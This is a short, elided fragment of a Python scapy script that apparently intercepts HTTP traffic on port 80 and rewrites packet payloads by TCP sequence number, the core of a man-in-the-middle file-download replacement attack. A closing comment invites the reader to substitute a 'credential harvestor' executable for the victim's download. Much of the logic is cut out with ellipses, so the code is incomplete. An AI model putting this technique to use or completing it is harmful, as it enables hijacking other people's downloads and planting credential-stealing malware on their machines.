    ...
    if scapy_packet.haslayer(scapy.Raw): 
        ...
        if scapy_packet[scapy.TCP].dport==80:#80 implies http port
            ...
            if scapy_packet[scapy.TCP].seq in ack_list:
                ...
                packet.set_payload(str(scapy_packet))#finally change payload of packet which need to be send
...
# can replace exe with exe file of your device ie replace with your credential harvestor
